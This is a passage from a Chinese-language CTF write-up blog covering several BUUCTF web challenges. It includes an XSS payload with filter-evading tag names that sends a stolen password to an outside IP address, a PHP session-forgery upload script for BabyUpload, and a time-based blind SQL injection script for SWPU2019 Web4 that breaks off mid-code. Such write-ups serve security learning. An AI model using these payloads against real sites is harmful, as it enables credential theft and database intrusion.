<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">&amp;&amp;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">cookies</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;; &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">cookie</span> <span class="o">=</span> <span class="p">{};</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">cookies</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nx">cookies</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nx">cookie</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="nx">cookie</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">])</span> <span class="o">!=</span> <span class="s2">&#34;undefined&#34;</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span><span class="p">(</span><span class="nx">cookie</span><span class="p">[</span><span class="s1">&#39;psw&#39;</span><span class="p">])</span> <span class="o">!=</span> <span class="s2">&#34;undefined&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">		<span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByName</span><span class="p">(</span><span class="s2">&#34;username&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">cookie</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByName</span><span class="p">(</span><span class="s2">&#34;password&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">cookie</span><span class="p">[</span><span class="s1">&#39;psw&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËÆ∞‰ΩèÂØÜÁ†ÅÂäüËÉΩ‰ºöÂ∞ÜËØªÂèñcookie‰∏≠ÁöÑpassword</p>
<p>‰∫éÊòØÊûÑÈÄ†‰∏Ä‰∏™ÁôªÂΩïÊ°ÜÂπ∂‰∏îÂºïÂÖ•login.jsÊèê‰∫§ÂèçÈ¶àÁ≠âÂæÖbotÁÇπÂºÄËé∑Âæóflag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">incookieput</span> <span class="n">type</span><span class="o">=</span><span class="s2">&#34;text&#34;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;username&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">incookieput</span> <span class="n">type</span><span class="o">=</span><span class="s2">&#34;password&#34;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;password&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">scrcookieipt</span> <span class="n">scookierc</span><span class="o">=</span><span class="s2">&#34;./js/login.js&#34;</span><span class="o">&gt;&lt;/</span><span class="n">scrcookieipt</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">scrcookieipt</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">	<span class="k">var</span> <span class="n">psw</span> <span class="o">=</span> <span class="n">docucookiement</span><span class="o">.</span><span class="n">getcookieElementsByName</span><span class="p">(</span><span class="s2">&#34;password&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">docucookiement</span><span class="o">.</span><span class="n">locacookietion</span><span class="o">=</span><span class="s2">&#34;http://47.122.53.248:2333/?psw=&#34;</span><span class="o">+</span><span class="n">psw</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">scrcookieipt</span><span class="o">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="hfctf2020babyupload">[HFCTF2020]BabyUpload
</h2><p>Ê∫êÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_save_path</span><span class="p">(</span><span class="s2">&#34;/var/babyctf/&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s2">&#34;/flag&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">===</span><span class="s1">&#39;admin&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span><span class="o">=</span><span class="s1">&#39;/var/babyctf/success.txt&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nx">safe_delete</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span><span class="s1">&#39;guest&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$direction</span> <span class="o">=</span> <span class="nx">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;direction&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$attr</span> <span class="o">=</span> <span class="nx">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;attr&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$dir_path</span> <span class="o">=</span> <span class="s2">&#34;/var/babyctf/&#34;</span><span class="o">.</span><span class="nv">$attr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$attr</span><span class="o">===</span><span class="s2">&#34;private&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$dir_path</span> <span class="o">.=</span> <span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$direction</span> <span class="o">===</span> <span class="s2">&#34;upload&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;up_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">&#39;invalid upload&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_path</span> <span class="o">=</span> <span class="nv">$dir_path</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;up_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_path</span> <span class="o">.=</span> <span class="s2">&#34;_&#34;</span><span class="o">.</span><span class="nx">hash_file</span><span class="p">(</span><span class="s2">&#34;sha256&#34;</span><span class="p">,</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;up_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/(\.\.\/|\.\.\\\\)/&#39;</span><span class="p">,</span> <span class="nv">$file_path</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">&#39;invalid file path&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$dir_path</span><span class="p">,</span> <span class="mo">0700</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;up_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span><span class="nv">$file_path</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$upload_result</span> <span class="o">=</span> <span class="s2">&#34;uploaded&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">&#39;error while saving&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">RuntimeException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$upload_result</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$direction</span> <span class="o">===</span> <span class="s2">&#34;download&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nx">filter_input</span><span class="p">(</span><span class="nx">INPUT_POST</span><span class="p">,</span> <span class="s1">&#39;filename&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_path</span> <span class="o">=</span> <span class="nv">$dir_path</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/(\.\.\/|\.\.\\\\)/&#39;</span><span class="p">,</span> <span class="nv">$file_path</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">&#39;invalid file path&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">&#39;file not exist&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Type: application/force-download&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Length: &#39;</span><span class="o">.</span><span class="nx">filesize</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Disposition: attachment; filename=&#34;&#39;</span><span class="o">.</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">65</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">readfile</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$download_result</span> <span class="o">=</span> <span class="s2">&#34;downloaded&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="s1">&#39;error while saving&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">RuntimeException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$download_result</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Áî±‰∫ésessionÊòØPHPSESSIDÊàë‰ª¨Áõ¥Êé•sess_sessidÊü•ÁúãsessionÊñá‰ª∂</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250506191720940.png"
	width="1893"
	height="692"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250506191720940_hu16537395824893143893.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250506191720940_hu12031525414134795751.png 1024w"
	loading="lazy"
	
		alt="image-20250506191720940"
	
	
		class="gallery-image" 
		data-flex-grow="273"
		data-flex-basis="656px"
	
></p>
<p>Â§ÑÁêÜÂô®Â∫îËØ•‰∏∫php_binary</p>
<p>ËÑöÊú¨‰º™ÈÄ†sessionÊñá‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php_binary&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_save_path</span><span class="p">(</span><span class="s2">&#34;./&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êñá‰ª∂ÂêçÊîπ‰∏∫sessÔºåÂà©Áî®hash_fileÊù•ËÆ°ÁÆósha256</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">hash_file</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="s1">&#39;./sess&#39;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂæóÂà∞Êñá‰ª∂Âêçsess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</p>
<p>‰∏ä‰º†Áî®postman</p>
<p>ÊàñËÄÖËÑöÊú¨‰º†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="n">BytesIO</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">BeAdmin</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(BytesIO(&#39;\x08usernames:5:&#34;admin&#34;;&#39;.encode(&#39;utf-8&#39;)))</span>
</span></span><span class="line"><span class="cl">    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;up_file&#34;</span><span class="p">:</span> <span class="p">(</span><span class="s2">&#34;sess&#34;</span><span class="p">,</span> <span class="n">BytesIO</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x08</span><span class="s1">usernames:5:&#34;admin&#34;;&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;attr&#39;</span><span class="p">:</span><span class="s1">&#39;.&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;direction&#39;</span><span class="p">:</span><span class="s1">&#39;upload&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://375fb983-49c0-4074-a8e6-6c98e5206ddc.node5.buuoj.cn:81/&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session_id</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x08</span><span class="s1">usernames:5:&#34;admin&#34;;&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">session_id</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÊàëÁî®apifox,‰∏ä‰º†Áî®upload</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250506194543059.png"
	width="1544"
	height="811"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250506194543059_hu13128530964778686959.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250506194543059_hu4119105761840831864.png 1024w"
	loading="lazy"
	
		alt="image-20250506194543059"
	
	
		class="gallery-image" 
		data-flex-grow="190"
		data-flex-basis="456px"
	
></p>
<p>Êé•ÁùÄ‰∏ä‰º†success.txt</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250506194942140.png"
	width="1215"
	height="136"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250506194942140_hu111892829501271508.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250506194942140_hu11116934968081920548.png 1024w"
	loading="lazy"
	
		alt="image-20250506194942140"
	
	
		class="gallery-image" 
		data-flex-grow="893"
		data-flex-basis="2144px"
	
></p>
<p>ÁÑ∂ÂêéÊääsessionÂÄºÊîπ‰∏Ä‰∏ãÂ∞±Ë°å‰∫Ü</p>
<h2 id="swpu2019web4">[SWPU2019]Web4
</h2><p>‰∏äÊù•Áõ≤Ê≥®Âá∫Â§á‰ªΩÊñá‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#author: c1e4r</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#È¢òÁõÆÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;http://f30f0574-3492-4a09-a14f-203db6705c1a.node5.buuoj.cn:81/index.php?r=Login/Login&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#Ê≥®ÂÖ•payload</span>
</span></span><span class="line"><span class="cl">    <span class="n">payloads</span> <span class="o">=</span> <span class="s2">&#34;asd&#39;;set @a=0x</span><span class="si">{0}</span><span class="s2">;prepare ctftest from @a;execute ctftest-- -&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#Êü•ËØ¢payload</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select if(ascii(substr((select flag from flag),</span><span class="si">{0}</span><span class="s2">,1))=</span><span class="si">{1}</span><span class="s2">,sleep(3),1)&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="c1">#Â∞ÜÊûÑÈÄ†Â•ΩÁöÑpayloadËøõË°å16ËøõÂà∂ËΩ¨Á†ÅÂíåjsonËΩ¨Á†Å</span>
</span></span><span class="line"><span class="cl">            <span class="n">datas</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span><span class="n">payloads</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">str_to_hex</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">))),</span><span class="s1">&#39;password&#39;</span><span class="p">:</span><span class="s1">&#39;test213&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">datas</span><span class="p">)</span>
